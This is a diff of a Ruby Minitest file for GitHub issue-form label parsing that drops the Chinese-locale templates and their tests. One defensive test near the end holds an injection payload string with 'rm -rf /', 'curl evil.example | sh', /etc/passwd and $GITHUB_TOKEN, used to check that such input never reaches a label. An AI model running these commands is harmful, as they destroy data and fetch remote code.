@@ -10,9 +10,7 @@ class IssueMetadataTest < Minitest::Test
   CONTRACT_PATH = File.expand_path('../issue-automation.json', __dir__)
   TEMPLATE_DIR = File.expand_path('../ISSUE_TEMPLATE', __dir__)
   BUG_EN = 'bug_report.yml'
-  BUG_ZH = 'bug_report.zh-CN.yml'
   FEATURE_EN = 'feature_request.yml'
-  FEATURE_ZH = 'feature_request.zh-CN.yml'
 
   # Renders an Issue Form the way GitHub renders a submitted issue, so every
   # fixture follows the shipped templates instead of restating their headings.
@@ -91,9 +89,7 @@ class IssueMetadataTest < Minitest::Test
 
   RENDERERS = {
     BUG_EN => FormRenderer.new(BUG_EN),
-    BUG_ZH => FormRenderer.new(BUG_ZH),
-    FEATURE_EN => FormRenderer.new(FEATURE_EN),
-    FEATURE_ZH => FormRenderer.new(FEATURE_ZH)
+    FEATURE_EN => FormRenderer.new(FEATURE_EN)
   }.freeze
 
   def setup
@@ -115,15 +111,6 @@ class IssueMetadataTest < Minitest::Test
     assert_equal %w[bug area:bug-fix], report['labels']
   end
 
-  def test_chinese_bug_form_maps_to_the_same_labels
-    report = analyze(BUG_ZH, '语音输入结束后未写入当前文本框', values: { 'area' => option(BUG_ZH, 1) })
-
-    assert report['valid'], report['errors'].join("\n")
-    assert_equal BUG_ZH, report['form']
-    assert_equal 'Bug Fix', report['area']
-    assert_equal %w[bug area:bug-fix], report['labels']
-  end
-
   def test_english_feature_form_is_valid
     report = analyze(FEATURE_EN, 'Support custom voice-organization prompts')
 
@@ -133,33 +120,16 @@ class IssueMetadataTest < Minitest::Test
     assert_equal %w[enhancement area:feature], report['labels']
   end
 
-  def test_chinese_feature_form_maps_to_the_same_labels
-    report = analyze(FEATURE_ZH, '支持自定义语音整理提示词')
-
-    assert report['valid'], report['errors'].join("\n")
-    assert_equal FEATURE_ZH, report['form']
-    assert_equal %w[enhancement area:feature], report['labels']
-  end
-
   def test_every_area_option_maps_to_the_same_canonical_label
     @contract.areas.each_with_index do |area, index|
-      [[BUG_EN, BUG_ZH], [FEATURE_EN, FEATURE_ZH]].each do |english, chinese|
-        [english, chinese].each do |file|
-          report = analyze(file, 'Same area in both locales', values: { 'area' => option(file, index) })
+      [BUG_EN, FEATURE_EN].each do |file|
+        report = analyze(file, 'Same area in English forms', values: { 'area' => option(file, index) })
 
-          assert_equal area['area'], report['area'], "#{file} option #{index}"
-          assert_equal area['label'], report['areaLabel'], "#{file} option #{index}"
-          assert report['valid'], report['errors'].join("\n")
-        end
+        assert_equal area['area'], report['area'], "#{file} option #{index}"
+        assert_equal area['label'], report['areaLabel'], "#{file} option #{index}"
+        assert report['valid'], report['errors'].join("\n")
       end
     end
-  end
-
-  def test_chinese_form_accepts_the_english_area_value
-    report = analyze(BUG_ZH, '跨语言取值', values: { 'area' => 'CI & Build' })
-
-    assert_equal 'area:ci-build', report['areaLabel']
-    assert report['valid'], report['errors'].join("\n")
   end
 
   def test_empty_required_value_is_reported
@@ -169,13 +139,6 @@ class IssueMetadataTest < Minitest::Test
     assert_includes report['errors'].join("\n"), "### #{label(BUG_EN, 'version')}"
     assert_includes report['labels'], 'needs-more-info'
     assert_includes report['labels'], 'bug'
-  end
-
-  def test_empty_required_value_is_reported_in_chinese
-    report = analyze(BUG_ZH, '缺少版本', values: { 'version' => '   ' })
-
-    refute report['valid']
-    assert_includes report['errors'].join("\n"), "### #{label(BUG_ZH, 'version')}"
   end
 
   def test_missing_required_section_is_reported
@@ -209,13 +172,6 @@ class IssueMetadataTest < Minitest::Test
     assert_includes report['labels'], 'needs-more-info'
   end
 
-  def test_unchecked_required_checkbox_is_reported_in_chinese
-    report = analyze(FEATURE_ZH, '未勾选确认', unchecked: ['checks'])
-
-    refute report['valid']
-    assert_includes report['errors'].join("\n"), checkbox(FEATURE_ZH, 0)
-  end
-
   def test_illegal_area_is_reported_with_the_allowed_options
     report = analyze(BUG_EN, 'Made up area', values: { 'area' => 'Performance' })
 
@@ -229,10 +185,10 @@ class IssueMetadataTest < Minitest::Test
   end
 
   def test_crlf_body_is_parsed_like_the_unix_body
-    unix = analyze(BUG_ZH, 'CRLF', values: { 'area' => option(BUG_ZH, 2) })
+    unix = analyze(BUG_EN, 'CRLF', values: { 'area' => option(BUG_EN, 2) })
     crlf = IssueMetadata.analyze(
-      title: RENDERERS[BUG_ZH].title('CRLF'),
-      body: RENDERERS[BUG_ZH].render(values: { 'area' => option(BUG_ZH, 2) }).gsub("\n", "\r\n"),
+      title: RENDERERS[BUG_EN].title('CRLF'),
+      body: RENDERERS[BUG_EN].render(values: { 'area' => option(BUG_EN, 2) }).gsub("\n", "\r\n"),
       contract: @contract
     )
 
@@ -330,7 +286,7 @@ class IssueMetadataTest < Minitest::Test
   # labels on the command line, so no field value may reach a label.
   def test_shell_metacharacters_never_reach_a_label
     payload = "$(rm -rf /) `id` ; rm -rf / && curl evil.example | sh --input /etc/passwd 'quote\" $GITHUB_TOKEN"
-    [BUG_EN, BUG_ZH, FEATURE_EN, FEATURE_ZH].each do |file|
+    [BUG_EN, FEATURE_EN].each do |file|
       report = analyze(file, payload, values: injected_values(file, payload))
 
       assert report['valid'], "#{file}: #{report['errors'].join("\n")}"
